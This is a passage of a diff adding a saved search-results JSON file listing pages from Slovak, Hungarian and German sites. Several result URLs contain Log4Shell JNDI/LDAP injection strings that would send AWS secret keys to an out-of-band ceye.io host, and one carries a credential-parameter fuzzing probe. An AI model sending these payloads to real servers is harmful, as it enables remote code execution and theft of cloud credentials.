+            "snippet": "Oznamy \u00b7 Pod\u00e1vanie \u017eiadost\u00ed o ubytovanie v akademickom roku 2020/2021 \u00b7 Ukon\u010denie 1. \u00b7 Stanovisko SRK k ot\u00e1zke plagi\u00e1torstva \u00b7 Vych\u00e1dza kritick\u00fd preklad ...",
+            "source": "truni.sk"
+        },
+        {
+            "position": 8,
+            "title": "Kezd\u0151lap - B\u00e1cs-Kiskun V\u00e1rmegyei Kereskedelmi \u00e9s ...",
+            "link": "https://www.bkmkik.hu/hu/?cookie_069f88e9145f7cfdea92831ca478c804=accepted&x=$%7Bjndi:ldap:/36.$%7Benv:AWS_SECRET_ACCESS_KEY%7D.2srsjk.ceye.io/a%7D&start=10",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.bkmkik.hu/hu/%3Fcookie_069f88e9145f7cfdea92831ca478c804%3Daccepted%26x%3D%24%257Bjndi:ldap:/36.%24%257Benv:AWS_SECRET_ACCESS_KEY%257D.2srsjk.ceye.io/a%257D%26start%3D10&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECDMQAQ",
+            "displayed_link": "https://www.bkmkik.hu \u203a 36.${en...",
+            "favicon": "https://serpapi.com/searches/67fcccda1c0b49c8ab4982cb/images/47d46cde42e06aef0b5d8570df8ed59430a16ad8e4baab234d3df0fa6224b360.png",
+            "snippet": "B\u00e1cs-Kiskun Megyei Kereskedelmi \u00e9s Iparkamara hivatalos oldala - Kezd\u0151lap.",
+            "source": "B\u00e1cs-Kiskun V\u00e1rmegyei Kereskedelmi \u00e9s Iparkamara"
+        },
+        {
+            "position": 9,
+            "title": "V\u0161etky \u010dl\u00e1nky | Trnavsk\u00e1 univerzita v Trnave",
+            "link": "https://www.truni.sk/clanky?ConsumerKey=m0643&DB_USERNAME=zqp21&SLACK_BOT_TOKEN=cv43j1%5Cqqq&a=aor22&access_token=yk7d8&admin=mzts1&aws_secret_access_key=jyii2&b_5d79329c92604e9a9e7fa9b98_58a3f3a0e6=q54b7&bucket=gsx53&cat=qeyn2&client_secret=zqoe4&clientsecret=cd851&consumer_key=lhy78&email=bv408&lang=kau69&name=uai90&ssh-key=s7yw7&sshkey=g9um0&type=uw2r3&y=i0p04&page=73",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.truni.sk/clanky%3FConsumerKey%3Dm0643%26DB_USERNAME%3Dzqp21%26SLACK_BOT_TOKEN%3Dcv43j1%255Cqqq%26a%3Daor22%26access_token%3Dyk7d8%26admin%3Dmzts1%26aws_secret_access_key%3Djyii2%26b_5d79329c92604e9a9e7fa9b98_58a3f3a0e6%3Dq54b7%26bucket%3Dgsx53%26cat%3Dqeyn2%26client_secret%3Dzqoe4%26clientsecret%3Dcd851%26consumer_key%3Dlhy78%26email%3Dbv408%26lang%3Dkau69%26name%3Duai90%26ssh-key%3Ds7yw7%26sshkey%3Dg9um0%26type%3Duw2r3%26y%3Di0p04%26page%3D73&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECDkQAQ",
+            "displayed_link": "https://www.truni.sk \u203a clanky \u203a aw...",
+            "favicon": "https://serpapi.com/searches/67fcccda1c0b49c8ab4982cb/images/47d46cde42e06aef0b5d8570df8ed594aa0095188f87a4668257df5e4925fa8a.png",
+            "snippet": "Pagination. First page \u00ab First \u00b7 Previous page \u2039 Previous \u2026 Page 72 \u00b7 Page 73 \u00b7 Aktu\u00e1lna str\u00e1nka 74 \u00b7 Page 75 \u00b7 Page 76 \u00b7 Page 77 \u2026",
+            "source": "truni.sk"
+        },
+        {
+            "position": 10,
+            "title": "SVAOe",
+            "link": "https://svaoe-hamburg.de/?x=$%7Bjndi:ldap:/317.$%7Benv:aws_secret_access_key%7D.2srsjk.ceye.io/a&start=40",
+            "redirect_link": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://svaoe-hamburg.de/%3Fx%3D%24%257Bjndi:ldap:/317.%24%257Benv:aws_secret_access_key%257D.2srsjk.ceye.io/a%26start%3D40&ved=2ahUKEwj5gIvnkteMAxX7AHkGHb9zNAQQFnoECDQQAQ",
+            "displayed_link": "https://svaoe-hamburg.de \u203a 317.${e...",
+            "favicon": "https://serpapi.com/searches/67fcccda1c0b49c8ab4982cb/images/47d46cde42e06aef0b5d8570df8ed594124999e96473332b0d50d8d8bc294fb3.png",
+            "date": "Sep 24, 2022",
+            "snippet": "SVAOe Hamburg - ein Segelverein mit Clubhaus in Altona und Liegepl\u00e4tzen in Wedel, M\u00fchlenberg, Eckernf\u00f6rde und an der Alster.",
+            "source": "SVAOe"
+        }
+    ]
+}
